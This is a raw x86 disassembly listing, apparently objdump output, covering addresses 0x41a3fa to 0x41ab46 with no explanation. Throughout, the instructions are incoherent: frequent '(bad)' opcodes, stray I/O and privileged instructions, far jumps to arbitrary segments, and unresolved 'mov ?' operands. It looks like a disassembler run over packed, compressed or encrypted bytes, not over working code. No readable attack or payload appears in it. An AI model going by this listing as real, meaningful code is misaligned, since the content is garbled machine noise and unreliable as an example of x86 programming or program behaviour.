  41a3fa:	add    esp,eax
  41a3fc:	addr16 imul edx,ebp,0xffffffa1
  41a400:	call   0xede8f7d1
  41a405:	adc    DWORD PTR [ebx],edi
  41a407:	fst    QWORD PTR [esi+0x4b]
  41a40a:	fucomi st,st(3)
  41a40c:	pop    ebp
  41a40d:	ficomp WORD PTR [edi+edx*4+0x2f7b16cd]
  41a414:	sti    
  41a415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a416:	popa   
  41a417:	sti    
  41a418:	xchg   edi,eax
  41a419:	call   0x2f985255
  41a41e:	loope  0x41a42c
  41a420:	(bad)  
  41a421:	js     0x41a436
  41a423:	int3   
  41a424:	bound  edi,QWORD PTR [ebp-0x77]
  41a427:	data16 ja 0x41a3db
  41a42a:	(bad)  
  41a42b:	push   cs
  41a42c:	lods   al,BYTE PTR ds:[esi]
  41a42d:	push   edi
  41a42e:	pop    ebp
  41a42f:	aaa    
  41a430:	xor    eax,0x916e7c0b
  41a435:	fs aad 0xab
  41a438:	(bad)  
  41a439:	sub    ch,ch
  41a43b:	mov    eax,0x6b3d7f70
  41a440:	xchg   ebp,eax
  41a441:	inc    esp
  41a442:	inc    ebp
  41a443:	rcr    BYTE PTR [edi+0x26],cl
  41a446:	xor    al,0x2f
  41a448:	test   BYTE PTR [ebx+eiz*4+0x671cb346],0x98
  41a450:	mov    edx,0xa26d1087
  41a455:	ret    0xb5ad
  41a458:	jne    0x41a49f
  41a45a:	pop    ecx
  41a45b:	xchg   ebp,eax
  41a45c:	jnp    0x41a4af
  41a45e:	dec    ebx
  41a45f:	or     DWORD PTR [edi-0x70],edi
  41a462:	in     al,0xe1
  41a464:	ret    0x5d20
  41a467:	xchg   edi,eax
  41a468:	icebp  
  41a469:	mov    edx,eax
  41a46b:	out    dx,al
  41a46c:	loopne 0x41a4da
  41a46e:	cs daa 
  41a470:	adc    edx,DWORD PTR [edx-0x79]
  41a473:	cs pop ecx
  41a475:	icebp  
  41a476:	call   0xffd769bb
  41a47b:	dec    esp
  41a47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47d:	shr    BYTE PTR [edx+0x24],1
  41a480:	xlat   BYTE PTR ds:[ebx]
  41a481:	adc    esp,0x754373e3
  41a487:	pop    edi
  41a488:	xchg   di,ax
  41a48a:	stc    
  41a48b:	xchg   BYTE PTR [ebp+0x683aea48],dl
  41a491:	inc    ebx
  41a492:	jp     0x41a416
  41a494:	cmc    
  41a495:	gs in  al,0x5f
  41a498:	pop    ecx
  41a499:	aas    
  41a49a:	clc    
  41a49b:	retf   0xd5c8
  41a49e:	inc    eax
  41a49f:	inc    edi
  41a4a0:	xchg   esi,eax
  41a4a1:	dec    esp
  41a4a2:	xchg   esi,eax
  41a4a3:	outs   dx,DWORD PTR ds:[esi]
  41a4a4:	cmp    al,0xdf
  41a4a6:	nop
  41a4a7:	cmp    BYTE PTR [ebp-0xa],0x82
  41a4ab:	test   eax,0xad86cf51
  41a4b0:	clc    
  41a4b1:	int    0x1d
  41a4b3:	xchg   esi,eax
  41a4b4:	or     esp,DWORD PTR [ebp-0x3854a23d]
  41a4ba:	out    dx,al
  41a4bb:	xchg   BYTE PTR [eax+0x3b796662],cl
  41a4c1:	dec    eax
  41a4c2:	add    ecx,edx
  41a4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4c5:	sbb    eax,0x250986c8
  41a4ca:	and    DWORD PTR fs:[eax-0x77],ebx
  41a4ce:	and    BYTE PTR [ebx],dl
  41a4d0:	(bad)  
  41a4d1:	cmp    eax,0x413095ab
  41a4d6:	(bad)  
  41a4d7:	xor    ah,BYTE PTR [ecx]
  41a4d9:	dec    edi
  41a4da:	cmp    al,0xaa
  41a4dd:	ins    DWORD PTR es:[edi],dx
  41a4de:	enter  0xf305,0xd2
  41a4e2:	in     eax,0xc9
  41a4e4:	and    al,0x59
  41a4e6:	pop    ebx
  41a4e7:	icebp  
  41a4e8:	retf   
  41a4e9:	js     0x41a50f
  41a4eb:	sub    ch,BYTE PTR [edx+edi*1+0x7d]
  41a4ef:	aam    0xf0
  41a4f1:	jge    0x41a50f
  41a4f3:	dec    ecx
  41a4f4:	push   edi
  41a4f5:	fdiv   st,st(2)
  41a4f7:	add    ch,bh
  41a4f9:	mov    ch,bl
  41a4fb:	ins    BYTE PTR es:[edi],dx
  41a4fc:	cdq    
  41a4fd:	jmp    0x55bb6299
  41a502:	push   ebp
  41a503:	retf   0x9c6b
  41a506:	push   ss
  41a507:	je     0x41a531
  41a509:	gs push ebx
  41a50b:	sbb    DWORD PTR [ebp-0x1f4788a],eax
  41a511:	out    0xae,eax
  41a513:	mov    ?,WORD PTR [ebp+0x220b8141]
  41a519:	(bad)  
  41a51a:	gs iret 
  41a51c:	repz or ebp,DWORD PTR [edi+0x1e]
  41a520:	xchg   ecx,eax
  41a521:	pop    ss
  41a522:	pop    esp
  41a523:	push   ds
  41a524:	aad    0xa1
  41a526:	rol    DWORD PTR ss:[ebx+0x67f21824],cl
  41a52d:	and    eax,0x9a00c00f
  41a532:	mov    eax,0x9abb3613
  41a537:	enter  0x1ab,0xca
  41a53b:	mov    esi,0x1092ea85
  41a540:	add    ebp,DWORD PTR ds:0xec3ae080
  41a546:	cdq    
  41a547:	cdq    
  41a548:	add    eax,0x913c92fc
  41a54d:	popa   
  41a54e:	sbb    BYTE PTR [ebx+ebp*2],al
  41a551:	(bad)  
  41a552:	scas   eax,DWORD PTR es:[edi]
  41a553:	or     edx,DWORD PTR [eax+0x79]
  41a556:	imul   edx,ebp,0xa0463638
  41a55c:	mul    BYTE PTR [ebp+0x7]
  41a55f:	jecxz  0x41a540
  41a561:	xchg   esi,eax
  41a562:	cdq    
  41a563:	push   ss
  41a564:	in     al,0x8b
  41a566:	sub    al,0x71
  41a568:	repnz aam 0xed
  41a56b:	jp     0x41a514
  41a56d:	into   
  41a56e:	and    eax,0x8af114d
  41a573:	lahf   
  41a574:	mov    esp,ds
  41a576:	pop    ebp
  41a577:	xor    dh,BYTE PTR [ebx]
  41a579:	mov    cs,edx
  41a57b:	call   0x4f9e:0x45401ae4
  41a582:	daa    
  41a583:	ss ds imul ebp,esi,0x21
  41a588:	push   ecx
  41a589:	jmp    0xc684:0xdade98ad
  41a590:	xchg   esp,eax
  41a591:	ins    DWORD PTR es:[edi],dx
  41a592:	mov    al,0xa5
  41a594:	xchg   edx,eax
  41a595:	hlt    
  41a596:	inc    ecx
  41a597:	(bad)  
  41a598:	fsub   DWORD PTR [edx-0xaf80a9]
  41a59e:	sub    BYTE PTR [edi],ch
  41a5a0:	daa    
  41a5a1:	jmp    0x36a8:0xcf9f473c
  41a5a8:	aaa    
  41a5a9:	into   
  41a5aa:	fimul  DWORD PTR [ecx-0x54]
  41a5ad:	cwde   
  41a5ae:	test   al,0x9
  41a5b0:	push   0xffffffd1
  41a5b2:	mov    esp,0x27cec78c
  41a5b7:	ds add eax,0x48f03d0e
  41a5bd:	dec    ebx
  41a5be:	pop    edx
  41a5bf:	jo     0x41a59f
  41a5c1:	mov    al,0xc6
  41a5c3:	or     al,0x96
  41a5c5:	ins    BYTE PTR es:[edi],dx
  41a5c6:	les    ecx,FWORD PTR [esi-0x61]
  41a5c9:	stc    
  41a5ca:	(bad)  
  41a5cb:	xor    DWORD PTR [edi-0x53],edx
  41a5ce:	pop    ds
  41a5cf:	pop    esp
  41a5d0:	repz add DWORD PTR [eax+ebp*1],edx
  41a5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5d5:	push   es
  41a5d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5d7:	cmp    eax,0x7ce040a3
  41a5dc:	mov    dh,0x2b
  41a5de:	mov    ebp,0x997b7865
  41a5e3:	mov    ch,BYTE PTR es:[ecx]
  41a5e6:	mov    edi,0x6d18aff7
  41a5eb:	cmp    DWORD PTR [eax],0x2
  41a5ee:	mov    esi,0x66272c34
  41a5f3:	mov    ah,0x7c
  41a5f5:	add    eax,0x4887e6d4
  41a5fa:	dec    ecx
  41a5fb:	stos   DWORD PTR es:[edi],eax
  41a5fc:	adc    al,0x48
  41a5fe:	or     BYTE PTR [eax+edx*2-0x6f2b20b6],dl
  41a605:	test   al,0x70
  41a607:	outs   dx,BYTE PTR ds:[esi]
  41a608:	stos   BYTE PTR es:[edi],al
  41a609:	gs into 
  41a60b:	iret   
  41a60c:	sub    eax,0x3330c8d8
  41a611:	xor    al,0x81
  41a613:	or     BYTE PTR [eax-0x5b],dh
  41a616:	hlt    
  41a617:	ss add edi,ebx
  41a61a:	mov    eax,0x44fd07ec
  41a61f:	lds    ecx,FWORD PTR [eax-0x47994ad4]
  41a625:	cwde   
  41a626:	push   ebx
  41a627:	pop    esp
  41a628:	mov    ecx,0x6c5e95ca
  41a62d:	cli    
  41a62e:	scas   eax,DWORD PTR es:[edi]
  41a62f:	mov    ?,ebx
  41a631:	jmp    0xf491:0x30f65a0e
  41a638:	mov    al,0x3a
  41a63a:	lock inc edx
  41a63c:	push   cs
  41a63d:	mov    ebx,0xeeab1676
  41a642:	mov    al,0xc
  41a644:	jmp    0x98389d4a
  41a649:	ret    
  41a64a:	ret    0xd3b8
  41a64d:	sub    dl,BYTE PTR [ebp+0x7bd133c1]
  41a653:	stos   BYTE PTR es:[edi],al
  41a654:	in     al,0xf4
  41a656:	in     eax,dx
  41a657:	sub    esp,DWORD PTR [ebx-0x7a4226a5]
  41a65d:	test   DWORD PTR [ebx],ebx
  41a65f:	dec    edi
  41a660:	add    ch,ah
  41a662:	into   
  41a663:	sti    
  41a664:	aas    
  41a665:	sbb    ch,BYTE PTR [eax+0x1df30c93]
  41a66b:	add    dh,BYTE PTR [ecx]
  41a66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a66e:	outs   dx,DWORD PTR ds:[esi]
  41a66f:	jmp    0xa871acfc
  41a674:	jle    0x41a667
  41a676:	scas   eax,DWORD PTR es:[edi]
  41a677:	cmp    DWORD PTR [ebp-0x5956cbe0],eax
  41a67d:	cdq    
  41a67e:	or     esp,0xffb62e2d
  41a684:	jp     0x41a63b
  41a686:	sub    ecx,edi
  41a688:	(bad)  
  41a689:	loope  0x41a681
  41a68b:	daa    
  41a68c:	mov    DWORD PTR [ebx+eax*2-0x719213c3],esi
  41a693:	mov    edx,0xed77c8a
  41a698:	xchg   esi,eax
  41a699:	adc    eax,0xc6482123
  41a69e:	imul   eax,DWORD PTR [ebp+0x527a79aa],0x2288f411
  41a6a8:	sti    
  41a6a9:	in     al,0x30
  41a6ab:	push   cs
  41a6ac:	mov    ecx,0x127f8996
  41a6b1:	ret    0x3cbe
  41a6b4:	bound  ebx,QWORD PTR [ecx+esi*2-0x7de83d7d]
  41a6bb:	enter  0xd1b5,0x4d
  41a6bf:	loope  0x41a73b
  41a6c1:	and    eax,0xd23d231d
  41a6c6:	stos   DWORD PTR es:[edi],eax
  41a6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6c8:	les    edi,FWORD PTR [edx]
  41a6ca:	ins    DWORD PTR es:[edi],dx
  41a6cb:	sub    eax,0xfb8f8c2f
  41a6d0:	sub    DWORD PTR [ecx],esp
  41a6d2:	ret    
  41a6d3:	ret    
  41a6d4:	mov    ds:0x440449b,eax
  41a6d9:	or     BYTE PTR [edx-0x4f],cl
  41a6dc:	sub    esp,DWORD PTR [ebx+0x23bc7607]
  41a6e2:	ror    BYTE PTR [ecx+ebp*4],cl
  41a6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e6:	fimul  WORD PTR [esi+0x51]
  41a6e9:	stos   BYTE PTR es:[edi],al
  41a6ea:	xchg   esi,eax
  41a6eb:	dec    edi
  41a6ec:	iret   
  41a6ed:	imul   edx,DWORD PTR [eax+0xe9ad7ec],0x60
  41a6f4:	cli    
  41a6f5:	push   esi
  41a6f6:	or     eax,0x8232aab9
  41a6fb:	push   ecx
  41a6fc:	jo     0x41a759
  41a6fe:	lock cwde 
  41a700:	cdq    
  41a701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a702:	addr16 lahf 
  41a704:	stc    
  41a705:	mov    edi,0xc61f40e0
  41a70a:	sub    eax,DWORD PTR [edx]
  41a70c:	fld    st(1)
  41a70e:	fsub   DWORD PTR [edi]
  41a710:	pop    ss
  41a711:	out    0x3a,al
  41a713:	ret    0x21f6
  41a716:	out    0xa4,eax
  41a718:	dec    esp
  41a719:	adc    eax,0xd8c1cf15
  41a71e:	jp     0x41a6aa
  41a720:	je     0x41a78b
  41a722:	data16 das 
  41a724:	sub    ecx,ecx
  41a726:	loope  0x41a770
  41a728:	gs mov sp,0x6da6
  41a72d:	push   0xfffffff0
  41a72f:	xchg   ebp,eax
  41a731:	push   ebp
  41a732:	dec    edx
  41a733:	push   esi
  41a734:	or     ebx,edi
  41a736:	mov    esp,0x2e10a123
  41a73b:	lock cdq 
  41a73d:	add    BYTE PTR [edi-0x15],dh
  41a740:	xchg   DWORD PTR [eax+0x49],eax
  41a743:	mov    bl,0xaf
  41a745:	cld    
  41a746:	or     DWORD PTR [edx+0x5e],esi
  41a749:	xchg   ecx,eax
  41a74a:	icebp  
  41a74b:	sbb    edi,DWORD PTR [esi-0x12]
  41a74e:	data16 jae 0x41a718
  41a751:	fild   DWORD PTR ss:[eax]
  41a754:	cld    
  41a755:	(bad)  
  41a756:	aas    
  41a757:	arpl   WORD PTR [ebp-0x4d],si
  41a75a:	sub    DWORD PTR [edx-0x521be898],esp
  41a760:	cwde   
  41a761:	inc    ebp
  41a762:	sub    DWORD PTR [ebp-0x36de97a2],ebp
  41a768:	adc    al,0xe8
  41a76a:	inc    ecx
  41a76b:	hlt    
  41a76c:	fsubp  st(7),st
  41a76e:	dec    ecx
  41a76f:	scas   al,BYTE PTR es:[edi]
  41a770:	sub    DWORD PTR [edx],ebx
  41a772:	xor    DWORD PTR [esi+0x7d561229],eax
  41a778:	scas   al,BYTE PTR es:[edi]
  41a779:	pop    es
  41a77a:	inc    ecx
  41a77b:	jmp    0x37a4:0x5411522
  41a782:	xchg   BYTE PTR [edx+0x5e2d6fe],al
  41a788:	adc    cl,dh
  41a78a:	push   eax
  41a78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a78c:	cmp    DWORD PTR [edi-0x13],ebp
  41a78f:	or     dh,BYTE PTR [ebx+0x51c4ecb3]
  41a795:	push   es
  41a796:	xor    dl,BYTE PTR [edi]
  41a798:	jbe    0x41a72c
  41a79a:	stc    
  41a79b:	in     eax,0x19
  41a79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a79e:	jl     0x41a744
  41a7a0:	scas   al,BYTE PTR es:[edi]
  41a7a1:	leave  
  41a7a2:	inc    edx
  41a7a3:	cmc    
  41a7a4:	test   DWORD PTR [ebx],ebx
  41a7a6:	mov    ebx,0xd5d6ef7b
  41a7ab:	adc    edx,DWORD PTR [ecx+0x7bfc1dde]
  41a7b1:	(bad)  
  41a7b2:	(bad)  
  41a7b3:	jns    0x41a7a3
  41a7b5:	mov    esp,0x2ccb155f
  41a7ba:	and    ah,BYTE PTR [eax+ebx*4+0x6b941bbe]
  41a7c1:	mov    al,0xa3
  41a7c3:	out    0x52,eax
  41a7c5:	rol    BYTE PTR [edx-0x78],1
  41a7c8:	inc    BYTE PTR [eax+eax*4]
  41a7cb:	rcr    BYTE PTR [ebx+eax*1+0x140bd2a6],cl
  41a7d2:	aaa    
  41a7d3:	xchg   edi,eax
  41a7d4:	dec    edi
  41a7d5:	xor    bh,0xfb
  41a7d8:	pop    ss
  41a7d9:	sbb    esi,0x58
  41a7dc:	cdq    
  41a7dd:	dec    ebp
  41a7de:	push   0x7afbd1b2
  41a7e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7e4:	popf   
  41a7e5:	clc    
  41a7e6:	jecxz  0x41a833
  41a7e8:	(bad)  
  41a7e9:	push   ecx
  41a7ea:	ret    
  41a7eb:	mov    esp,0x4dde91dc
  41a7f0:	retf   
  41a7f1:	call   0x60d92af5
  41a7f6:	adc    eax,0x19678628
  41a7fb:	aam    0x12
  41a7fd:	cmp    al,0xba
  41a7ff:	add    al,dl
  41a801:	sahf   
  41a802:	pop    ebx
  41a803:	lahf   
  41a804:	adc    al,0xa2
  41a806:	jae    0x41a839
  41a808:	stos   BYTE PTR es:[edi],al
  41a809:	xchg   DWORD PTR [ecx+eax*8],ebp
  41a80c:	out    dx,eax
  41a80d:	mov    eax,0x470f28e
  41a812:	xor    al,0x2a
  41a814:	in     eax,dx
  41a815:	cli    
  41a816:	ucomiss xmm3,DWORD PTR [edi-0x632ab8d1]
  41a81d:	call   0x477a6a9c
  41a822:	mov    ds:0x72b04023,eax
  41a827:	xor    DWORD PTR [esi+0x308ac83f],0xffffffe2
  41a82e:	retf   
  41a82f:	(bad)  
  41a830:	(bad)  
  41a831:	sbb    dh,BYTE PTR [edi]
  41a833:	xchg   edi,eax
  41a834:	(bad)  
  41a836:	mov    dl,0x5
  41a838:	sar    DWORD PTR [edi+0x667a35c4],1
  41a83e:	push   esi
  41a83f:	in     al,0xab
  41a841:	repnz rcl edx,cl
  41a844:	xor    DWORD PTR [ebx],edx
  41a846:	shl    BYTE PTR [ecx],0xeb
  41a849:	sub    DWORD PTR [edi-0x73],ebp
  41a84c:	shr    BYTE PTR [edx+0x4c],1
  41a84f:	mov    ecx,DWORD PTR [ebx-0x15b73fdd]
  41a855:	cmc    
  41a856:	shr    BYTE PTR [edi+0x49d36ff2],cl
  41a85c:	addr16 (bad) 
  41a85e:	pop    ecx
  41a85f:	mov    dh,0x6b
  41a861:	xchg   esi,eax
  41a862:	test   ebp,ebx
  41a864:	sahf   
  41a865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a866:	and    dh,BYTE PTR [edi]
  41a868:	in     eax,dx
  41a869:	sub    DWORD PTR [ecx-0x51ef9191],ecx
  41a86f:	push   0xffffffb9
  41a871:	xchg   esp,eax
  41a872:	xor    eax,0x4b09ab05
  41a878:	xor    dl,BYTE PTR [edi-0x902aac]
  41a87e:	pop    es
  41a87f:	xchg   BYTE PTR [edx+0x2b],dl
  41a882:	xor    dl,cl
  41a884:	popf   
  41a885:	dec    esp
  41a886:	(bad)  
  41a888:	dec    edx
  41a889:	mov    al,ds:0xc4bb9848
  41a88e:	xchg   BYTE PTR ds:0x16a8d467,bl
  41a894:	shr    BYTE PTR [eax+0x1fc4faa2],1
  41a89a:	out    0x30,al
  41a89c:	das    
  41a89d:	stos   BYTE PTR es:[edi],al
  41a89e:	aaa    
  41a89f:	dec    eax
  41a8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8a1:	fldenv [eax]
  41a8a3:	mov    cl,ch
  41a8a5:	inc    edx
  41a8a6:	push   0xffffffc7
  41a8a8:	inc    ebx
  41a8a9:	inc    ebx
  41a8aa:	mov    al,0xda
  41a8ac:	ror    BYTE PTR [esp+esi*2-0x5be7bcb3],0xad
  41a8b4:	push   edx
  41a8b5:	fwait
  41a8b6:	ja     0x41a848
  41a8b8:	icebp  
  41a8b9:	ror    DWORD PTR [edx-0x3f],0xc1
  41a8bd:	push   esi
  41a8be:	arpl   ax,di
  41a8c0:	out    dx,eax
  41a8c1:	bound  edi,QWORD PTR [eax+0x3e6ae19d]
  41a8c7:	(bad)  
  41a8c9:	adc    eax,0xd1999d0d
  41a8ce:	and    ebp,DWORD PTR [edi]
  41a8d0:	push   0x9d02013f
  41a8d5:	cmp    al,0x96
  41a8d7:	cmp    BYTE PTR [ebx+0x653c7472],al
  41a8dd:	ss jmp 0xaca52eef
  41a8e3:	inc    ecx
  41a8e4:	outs   dx,DWORD PTR ds:[esi]
  41a8e5:	push   edi
  41a8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e7:	sbb    al,0x10
  41a8e9:	pop    ebx
  41a8ea:	mov    ecx,0x8d00217c
  41a8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f0:	js     0x41a87f
  41a8f2:	nop
  41a8f3:	test   BYTE PTR [ebp+0x51a1ce24],ah
  41a8f9:	xor    al,0xce
  41a8fb:	or     BYTE PTR [ecx-0x1364ff1c],cl
  41a901:	and    eax,0x2e377ae3
  41a906:	sbb    al,0xae
  41a908:	iret   
  41a909:	mov    esp,0x871f52d7
  41a90e:	test   al,0x96
  41a910:	sbb    bl,BYTE PTR [ebp+0x7e]
  41a913:	arpl   WORD PTR [esi],bp
  41a915:	aam    0x52
  41a917:	mov    BYTE PTR [edx],bl
  41a919:	and    eax,0xb9f4cc94
  41a91e:	ret    
  41a91f:	test   DWORD PTR [edx],ecx
  41a921:	jo     0x41a8db
  41a923:	int    0x52
  41a925:	fwait
  41a926:	adc    DWORD PTR [eax],eax
  41a928:	loop   0x41a946
  41a92a:	je     0x41a8b5
  41a92c:	sub    BYTE PTR [ecx],dh
  41a92e:	fwait
  41a92f:	bound  edx,QWORD PTR [edx]
  41a931:	xor    edi,DWORD PTR [esi-0x1a]
  41a934:	push   edi
  41a935:	loope  0x41a90e
  41a937:	(bad)  
  41a938:	push   ds
  41a939:	adc    al,0x9c
  41a93b:	sbb    DWORD PTR ds:0xdc38199c,eax
  41a941:	cld    
  41a942:	out    0xb2,eax
  41a944:	and    al,0x65
  41a946:	lock out dx,al
  41a948:	or     esp,edi
  41a94a:	pop    edx
  41a94b:	in     al,0xe7
  41a94d:	call   FWORD PTR [edx-0x34]
  41a950:	test   DWORD PTR [esi],esi
  41a952:	in     al,dx
  41a953:	add    al,0x90
  41a955:	jle    0x41a950
  41a957:	and    eax,esi
  41a959:	add    edx,DWORD PTR [ebx+0x18]
  41a95c:	retf   0xbab1
  41a95f:	xchg   DWORD PTR [eax],eax
  41a961:	repz ficomp DWORD PTR [ebp+0x7562d84b]
  41a968:	mov    esi,edi
  41a96a:	or     eax,0xc3da87dd
  41a96f:	adc    DWORD PTR [ecx],esi
  41a971:	pop    ebp
  41a972:	jg     0x41a986
  41a974:	sub    DWORD PTR [eax-0x4435fead],0xffffffb5
  41a97b:	inc    ebx
  41a97c:	lods   al,BYTE PTR ds:[esi]
  41a97d:	xor    DWORD PTR [ebx+0x706782b],ebx
  41a983:	add    BYTE PTR [edi-0x1f52654a],al
  41a989:	push   es
  41a98a:	aam    0x6
  41a98c:	rol    bh,0x99
  41a98f:	fld    TBYTE PTR [ecx]
  41a991:	ret    
  41a992:	iret   
  41a993:	and    al,0xeb
  41a995:	into   
  41a996:	addr16 jl 0x41a926
  41a999:	outs   dx,DWORD PTR ds:[esi]
  41a99a:	ins    DWORD PTR es:[edi],dx
  41a99b:	scas   al,BYTE PTR es:[edi]
  41a99c:	jbe    0x41a989
  41a99e:	icebp  
  41a99f:	pop    es
  41a9a0:	cld    
  41a9a1:	or     ebp,edx
  41a9a3:	std    
  41a9a4:	mov    ?,ebp
  41a9a6:	jne    0x41aa13
  41a9a8:	and    DWORD PTR [edx],edx
  41a9aa:	gs xchg esp,eax
  41a9ac:	mov    al,ds:0x93fd2aa2
  41a9b1:	test   DWORD PTR [esi+0x55],0x23fb84d8
  41a9b8:	lahf   
  41a9b9:	cwde   
  41a9ba:	mov    bh,0x38
  41a9bc:	xchg   esp,eax
  41a9bd:	in     eax,dx
  41a9be:	and    ebp,DWORD PTR [ebp+esi*4+0x27]
  41a9c2:	lods   eax,DWORD PTR ds:[esi]
  41a9c3:	iret   
  41a9c4:	retf   
  41a9c5:	cmp    esp,DWORD PTR [edi+0x4e]
  41a9c8:	push   edi
  41a9c9:	call   eax
  41a9cb:	ror    cl,0x7
  41a9ce:	pop    es
  41a9cf:	shl    BYTE PTR [edi+eax*1+0x5],cl
  41a9d3:	cld    
  41a9d4:	mov    BYTE PTR [ebx+eax*1+0x45],ch
  41a9d8:	aam    0x7
  41a9da:	lahf   
  41a9db:	fsub   DWORD PTR [edx]
  41a9dd:	sub    al,0xde
  41a9df:	jle    0x41a976
  41a9e1:	mov    BYTE PTR [ebp+0x4c],0xf7
  41a9e5:	adc    DWORD PTR [eax-0x5ac038d7],ebx
  41a9eb:	push   esi
  41a9ec:	retf   0x539d
  41a9ef:	aam    0xbf
  41a9f1:	inc    ebp
  41a9f2:	imul   ebx,ecx,0x86ffe47b
  41a9f8:	sbb    esp,ebp
  41a9fa:	cmc    
  41a9fb:	mov    cs,WORD PTR [ecx-0x58]
  41a9fe:	cmc    
  41a9ff:	jno    0x41a9ca
  41aa01:	(bad)  
  41aa03:	dec    ebx
  41aa04:	or     ebp,DWORD PTR [ebp-0x19]
  41aa07:	aaa    
  41aa08:	jp     0x41aa63
  41aa0a:	push   edi
  41aa0b:	or     BYTE PTR [ebx],dl
  41aa0d:	lahf   
  41aa0e:	in     eax,0xb8
  41aa10:	bound  ebp,QWORD PTR [eax+0x57]
  41aa13:	aam    0xe6
  41aa15:	sub    DWORD PTR [edx+0x1671987c],ecx
  41aa1b:	into   
  41aa1c:	fmulp  st(6),st
  41aa1e:	jmp    0x9d74:0x6e7e9795
  41aa25:	mov    cl,0x94
  41aa27:	mov    cl,0xfe
  41aa29:	pop    es
  41aa2a:	aaa    
  41aa2b:	mov    ch,0xa
  41aa2d:	mov    es,WORD PTR [ecx+0x30c4b96e]
  41aa33:	mov    dh,0xff
  41aa35:	ins    BYTE PTR es:[edi],dx
  41aa36:	push   eax
  41aa38:	jnp    0x41aa2b
  41aa3a:	je     0x41aa44
  41aa3c:	pop    edi
  41aa3d:	ins    BYTE PTR es:[edi],dx
  41aa3e:	or     BYTE PTR [ecx+0x31],0x6e
  41aa42:	out    dx,al
  41aa43:	jle    0x41a9ec
  41aa45:	clc    
  41aa46:	jmp    0x2bc183a0
  41aa4b:	pusha  
  41aa4c:	(bad)  
  41aa4d:	in     eax,dx
  41aa4e:	or     ecx,DWORD PTR ds:0x9988576
  41aa54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa55:	mov    ah,BYTE PTR [ebx]
  41aa57:	enter  0xbf10,0x5c
  41aa5b:	stc    
  41aa5c:	jecxz  0x41aa00
  41aa5e:	retf   0x1f9a
  41aa61:	data16 jns 0x41aaad
  41aa64:	mov    cl,0xe
  41aa66:	cmp    ch,BYTE PTR [ecx+0x36]
  41aa69:	adc    DWORD PTR [eax-0x7c],esp
  41aa6c:	pop    ds
  41aa6d:	dec    edi
  41aa6e:	jns    0x41aa32
  41aa70:	ss push 0x3a
  41aa73:	sbb    DWORD PTR [ecx-0x2e],ebp
  41aa76:	add    eax,0x633a563a
  41aa7b:	enter  0xd61,0x62
  41aa7f:	sub    al,0x92
  41aa81:	test   DWORD PTR [esp+edi*1-0x253f997a],ebx
  41aa88:	sbb    eax,DWORD PTR fs:[ebp-0x7f23bc49]
  41aa8f:	pop    edx
  41aa90:	sub    DWORD PTR [ebp+ecx*8-0x3e],0xf4ff778a
  41aa98:	add    DWORD PTR [edx+edx*8+0x28],0xb21087c6
  41aaa0:	push   ss
  41aaa1:	stos   BYTE PTR es:[edi],al
  41aaa2:	lea    eax,[edi+0x7479775d]
  41aaa8:	dec    esi
  41aaa9:	jne    0x41aa5f
  41aaab:	mov    cl,0x90
  41aaad:	call   0xf756:0x7096f3cf
  41aab4:	lar    ecx,WORD PTR [edi-0x46]
  41aab8:	aad    0xed
  41aaba:	jae    0x41aa40
  41aabc:	aam    0xaf
  41aabe:	sbb    DWORD PTR [eax],edi
  41aac0:	out    0x5b,eax
  41aac2:	pop    ss
  41aac3:	aam    0xdd
  41aac5:	out    0x1e,eax
  41aac7:	add    eax,0xa7222cfc
  41aacc:	cmp    ebp,DWORD PTR [esi+0x1cc98a2e]
  41aad2:	arpl   WORD PTR [edi+0x68],sp
  41aad5:	lahf   
  41aad6:	sub    BYTE PTR [edx+0x3dfc4ac3],dl
  41aadc:	retf   0x82c
  41aadf:	pop    eax
  41aae0:	in     eax,dx
  41aae1:	inc    ebp
  41aae2:	xor    edi,DWORD PTR [edx-0x9]
  41aae5:	mov    dh,0x93
  41aae7:	lods   al,BYTE PTR ds:[esi]
  41aae8:	mov    ch,0x41
  41aaea:	inc    eax
  41aaeb:	add    al,0xdf
  41aaed:	lock aad 0x95
  41aaf0:	add    esp,DWORD PTR [ebx+edi*1-0x77]
  41aaf4:	cmp    al,0x12
  41aaf6:	cs jae 0x41ab44
  41aaf9:	sbb    ebp,DWORD PTR [eax-0x15]
  41aafc:	out    dx,eax
  41aafd:	and    al,0x4c
  41aaff:	push   ebp
  41ab00:	xor    DWORD PTR [edi-0x535942b8],ebx
  41ab06:	mov    eax,0x7fdfe4c1
  41ab0b:	adc    al,0x3c
  41ab0d:	rcl    BYTE PTR ds:0xa2c26e9f,cl
  41ab13:	stos   BYTE PTR es:[edi],al
  41ab14:	ret    
  41ab15:	fwait
  41ab16:	icebp  
  41ab17:	stc    
  41ab18:	loope  0x41ab84
  41ab1a:	les    edi,FWORD PTR [ecx+eax*8+0x5f]
  41ab1e:	lahf   
  41ab1f:	push   0x9
  41ab21:	pushf  
  41ab22:	scas   al,BYTE PTR es:[edi]
  41ab23:	mov    ds:0xbb25f9fd,al
  41ab28:	or     DWORD PTR [si],ebx
  41ab2b:	pop    eax
  41ab2c:	icebp  
  41ab2d:	repnz cmp edi,edx
  41ab30:	and    BYTE PTR [esp+eax*1+0x4f],cl
  41ab34:	adc    ch,BYTE PTR [ebx-0x16]
  41ab37:	rcr    DWORD PTR [ecx+0x3da8cc95],1
  41ab3d:	sbb    BYTE PTR ds:0x2c257c57,bl
  41ab43:	mov    dl,0xee
  41ab45:	out    dx,eax
  41ab46:	mov    esp,0x83ac36f5
